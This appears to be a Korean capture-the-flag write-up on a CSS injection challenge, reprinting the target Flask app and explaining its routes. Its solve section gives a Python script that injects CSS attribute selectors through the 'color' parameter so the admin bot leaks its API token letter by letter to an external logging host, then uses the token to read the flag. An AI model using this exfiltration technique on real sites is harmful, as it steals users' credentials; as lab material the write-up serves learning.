---
title: "[2025-08-16] CSS Injection"
excerpt: "CSS Injection"

categories:
  - Problem
tags:
  - [XSS, CSS Injection]

permalink: /Problem/[2025-08-16] CSS Injection/

toc: true
toc_sticky: true

date: 2025-08-16
last_modified_at: 2025-08-16
---

## 🦥 본문

- main.py

```jsx
from promise import Promise
from time import sleep

app = Flask(__name__)
app.secret_key = os.urandom(32)

DATABASE = os.environ.get("DATABASE", "database.db")

try:
    FLAG = open("./flag.txt", "r").read().strip()
except:
    FLAG = "[**FLAG**]"

ADMIN_USERNAME = "administrator"
ADMIN_PASSWORD = binascii.hexlify(os.urandom(32))

def execute(query, data=()):
    con = sqlite3.connect(DATABASE)
    cur = con.cursor()
    cur.execute(query, data)
    con.commit()
    data = cur.fetchall()
    con.close()
    return data

def token_generate():
    while True:
        token = "".join(random.choice(string.ascii_lowercase) for _ in range(8))
        token_exists = execute(
            "SELECT * FROM users WHERE token = :token;", {"token": token}
        )
        if not token_exists:
            return token

def login_required(view):
    @wraps(view)
    def wrapped_view(**kwargs):
        if session and session["uid"]:
            return view(**kwargs)
        flash("login first !")
        return redirect(url_for("login"))

    return wrapped_view

def apikey_required(view):
    @wraps(view)
    def wrapped_view(**kwargs):
        apikey = request.headers.get("API-KEY", None)
        token = execute("SELECT * FROM users WHERE token = :token;", {"token": apikey})
        if token:
            request.uid = token[0][0]
            return view(**kwargs)
        return {"code": 401, "message": "Access Denined !"}

    return wrapped_view

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, "_database", None)
    if db is not None:
        db.close()

@app.context_processor
def background_color():
    color = request.args.get("color", "white")
    return dict(color=color)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "GET":
        return render_template("login.html")
    else:
        username = request.form.get("username")
        password = request.form.get("password")
        user = execute(
            "SELECT * FROM users WHERE username = :username and password = :password;",
            {
                "username": username,
                "password": hashlib.sha256(password.encode()).hexdigest(),
            },
        )

        if user:
            session["uid"] = user[0][0]
            session["username"] = user[0][1]
            return redirect(url_for("index"))

        flash("Wrong username or password !")
        return redirect(url_for("login"))

@app.route("/logout")
@login_required
def logout():
    session.clear()
    flash("Logout !")
    return redirect(url_for("index"))

@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "GET":
        return render_template("register.html")
    else:
        username = request.form.get("username")
        password = request.form.get("password")

        user = execute(
            "SELECT * FROM users WHERE username = :username;", {"username": username}
        )
        if user:
            flash("Username already exists !")
            return redirect(url_for("register"))

        token = token_generate()
        sql = "INSERT INTO users(username, password, token) VALUES (:username, :password, :token);"
        execute(
            sql,
            {
                "username": username,
                "password": hashlib.sha256(password.encode()).hexdigest(),
                "token": token,
            },
        )
        flash("Register Success.")
        return redirect(url_for("login"))

@app.route("/mypage")
@login_required
def mypage():
    user = execute("SELECT * FROM users WHERE uid = :uid;", {"uid": session["uid"]})
    return render_template("mypage.html", user=user[0])

@app.route("/memo", methods=["GET", "POST"])
@login_required
def memopage():
    if request.method == "GET":
        memos = execute("SELECT * FROM memo WHERE uid = :uid;", {"uid": session["uid"]})
        return render_template("memo.html", memos=memos)
    else:
        memo = request.form.get("memo")
        sql = "INSERT INTO memo(uid, text) VALUES(:uid, :text);"
        execute(sql, {"uid": session["uid"], "text": memo})
    return redirect(url_for("memopage"))

# report
@app.route("/report", methods=["GET", "POST"])
def report():
    if request.method == "POST":
        path = request.form.get("path")
        if not path:
            flash("fail.")
            return redirect(url_for("report"))

        if path and path[0] == "/":
            path = path[1:]

        url = f"http://127.0.0.1:8000/{path}"
        if check_url(url):
            flash("success.")
        else:
            flash("fail.")
        return redirect(url_for("report"))

    elif request.method == "GET":
        return render_template("report.html")

def check_url(url):
    try:
        service = Service(executable_path="/chromedriver-linux64/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)

        driver_promise = Promise(driver.get("http://127.0.0.1:8000/login"))
        driver_promise.then(
            driver.find_element(By.NAME, "username").send_keys(str(ADMIN_USERNAME))
        )
        driver_promise.then(
            driver.find_element(By.NAME, "password").send_keys(ADMIN_PASSWORD.decode())
        )
        driver_promise = Promise(driver.find_element(By.ID, "submit").click())
        sleep(0.1)
        driver_promise.then(driver.get(url))

    except Exception as e:
        driver.quit()
        return False
    finally:
        driver.quit()
    return True
    
    
# API
@app.route("/api/me")
@apikey_required
def APIme():
    user = execute("SELECT * FROM users WHERE uid = :uid;", {"uid": request.uid})
    if user:
        return {"code": 200, "uid": user[0][0], "username": user[0][1]}
    return {"code": 500, "message": "Error !"}

@app.route("/api/memo")
@apikey_required
def APImemo():
    memos = execute("SELECT * FROM memo WHERE uid = :uid;", {"uid": request.uid})
    if memos:
        memo = []
        for tmp in memos:
            memo.append({"idx": tmp[0], "memo": tmp[2]})
        return {"code": 200, "memo": memo}

    return {"code": 500, "message": "Error !"}

# For Challenge
def init():
    execute("DROP TABLE IF EXISTS users;")
    execute(
        """
        CREATE TABLE users (
            uid INTEGER PRIMARY KEY,
            username TEXT NOT NULL UNIQUE,
            password TEXT NOT NULL,
            token TEXT NOT NULL UNIQUE
        );
    """
    )

    execute("DROP TABLE IF EXISTS memo;")
    execute(
        """
        CREATE TABLE memo (
            idx INTEGER PRIMARY KEY,
            uid INTEGER NOT NULL,
            text TEXT NOT NULL
        );
    """
    )

    # Add admin
    execute(
        "INSERT INTO users (username, password, token)"
        "VALUES (:username, :password, :token);",
        {
            "username": ADMIN_USERNAME,
            "password": hashlib.sha256(ADMIN_PASSWORD).hexdigest(),
            "token": token_generate(),
        },
    )

    adminUid = execute(
        "SELECT * FROM users WHERE username = :username;", {"username": ADMIN_USERNAME}
    )

    # Add FLAG
    execute(
        "INSERT INTO memo (uid, text)" "VALUES (:uid, :text);",
        {"uid": adminUid[0][0], "text": "FLAG is " + FLAG},
    )

with app.app_context():
    init()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)

```

- `excute()` : 쿼리문과 파라미터를 받아 DB에서 데이터를 받아오는 메소드
- `token_generate()` : 8자리 소문자 알파벳으로 구성된 랜덤 문자열을 만들고 사용된 적이 없으면 토큰을 리턴
- `login_required()` : 세션과 세션의 아이디가 있으면 통과. 아니면 로그인 화면으로 이동
- `apikey_required()` : 요청 헤더의 apikey를 통해 DB에서 사용자를 찾고 요청의 uid와 같으면 통과
- `@app.teardown_appcontext` : 어플리케이션 컨텍스트 종료 시 실행되는 함수를 등록하는 데 사용하는 데코레이터
    - `close_connection()` : DB 연결 끊는 함수.
- `@app.context_processor` : 템플릿 렌더링시 자동으로 전달할 값을 지정하는 함수 등록하는 데 사용하는 데코레이터
    - `background_color()` : 요청에서 `color` 값을 가져오고 없으면 기본값인 white 사용. color = 색을 딕셔너리로 만들어서 리턴
- `/` : index.html 렌더링
- `/login` : username과 password를 받고 조회. 세션에 아이디와 username 등록 후 로그인
- `/logout` : 세션 삭제
- `/register` : username과 password를 받고 이미 있으면 등록 불가. 없는 경우 토큰을 만들고 해당 값을 DB에 저장
- `/mypage` : 세션의 uid를 통해 사용자를 찾고 해당 값에 맞게 mypage 렌더링
    - mypage.html : 사용자의 uid, username, token 값을 `input readonly` 에 넣음. 버튼을 클릭하면 토큰 값을 복사
- `/memo` : GET 방식은 세션을 통해 해당 메모 페이지를 렌더링. POST 방식은 세션 ID와 입력한 텍스트를 메모로 DB에 저장
- `/report` : POST 방식으로 path를 파라미터로 받음. 해당 path로 `check_url()` 실행
- `check_url()` : 관리자 계정으로 웹 드라이버를 통해 로그인
- `/api/me` : `apikey_required()` 를 실행 후 세션의 uid와 username을 알려줌
- `/api/memo` : `apikey_required()` 를 실행 후 세션의 uid로 메모를 가져옴. 리스트로 만들어서 출력
- Flag 값은 관리자의 메모장에 있음

mypage 부분에서 토큰 값이 노출된다는 점

check_url에서 관리자 계정으로 로그인한다는 점 

color 값을 통해 CSS Injection을 할 수 있다는 점  

관리자의 uid가 필요. 관리자의 uid를 통해 모든 메모장을 봐야 함

1. 관리자의 아이디와 비밀번호를 알아내서 메모페이지에 들어간다
2. 웹드라이버에서 /api/memo를 사용하여 리스트를 어디에 기록한다?
3. 관리자의 토큰을 알아내서 /api/memo를 실행한다 → 괜찮은 듯

웹드라이버를 통해 mypage 페이지 부분에서 color 값을 통해 토큰이 맞을 때 마다 스타일을 바꾸거나 공격용 서버에 응답하게 해야 함.

그 후 토큰을 알아내고 헤더에 API-KEY에 집어 넣고  /api/memo를 실행

응답하게 함. → 토큰을 알아낼 수 있음

개인용 서버가 없어서 github 블로그를 쓰려고 했는 데 정적인 페이지만 가능해서 동적으로 5초 뒤에 응답하는 건 불가능 하다고 한다. 

이게 웬 걸 드림핵 툴즈에서 응답을 받고 로그를 찍는 도구가 있었다.

### 풀이 과정

1. 다음과 같은 코드를 토큰이 나올 때까지 반복

```jsx
import requests, string
 
URL = "http://host1.dreamhack.games:20690/report"
curr= "gsupsof"

 
for token in string.ascii_lowercase: 
    data = {"path":"mypage?color=white;} input[id=InputApitoken][value^="+curr+token+"] {background: url(https://itdkonu.request.dreamhack.games/"+curr+token+");"}
    response = requests.post(URL, data=data)
    print(f"'{token}': Status {response.status_code}")
```

1. 토큰 8자리를 알아내면 다음과 같은 코드를 작성하여 API-KEY에 실어 보내어 FLAG를 받음

```jsx
import requests

API_URL = "http://host1.dreamhack.games:20690/api/memo"
TOKEN   = "gsupsofu"  # 여기다가 CSS Injection으로 추출한 토큰 넣기

res = requests.get(API_URL, headers={"API-KEY": TOKEN})
print(res.json())
```